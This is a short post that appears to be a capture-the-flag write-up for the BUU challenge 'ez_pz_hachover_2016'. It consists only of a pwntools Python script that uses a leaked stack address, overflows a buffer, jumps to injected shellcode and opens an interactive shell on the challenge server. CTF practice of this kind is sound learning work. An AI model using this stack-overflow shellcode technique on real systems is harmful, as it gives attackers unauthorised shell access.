+++
title = "exp2"
date = "2026-03-04"
type = "post"
categories = ['BUU']
tags = ['第二页', '2-1', '2-1-2', 'ez_pz_hachover_2016']
draft = false
+++
```python
from pwn import *  
context(arch='i386', os='linux', log_level='debug')  
  
io = connect('node5.buuoj.cn',25977 )  
  
offset = 0x16 + 0x04 - 0x08  
vuln_addr = 0x08048603  
  
elf = ELF("./pwn")  
io.recvuntil(b'Yippie, lets crash: ')  
s_addr = int(io.recvline().strip(),16)  
print(hex(s_addr))  
  
shellcode=asm(shellcraft.sh())  
io.recvline()  
io.recvuntil(b'> ')  
payload=b'crashme\x00'  
payload += b'a' * offset + p32(s_addr - 0x1c) + shellcode  
io.sendline(payload)  
  
io.interactive()
```
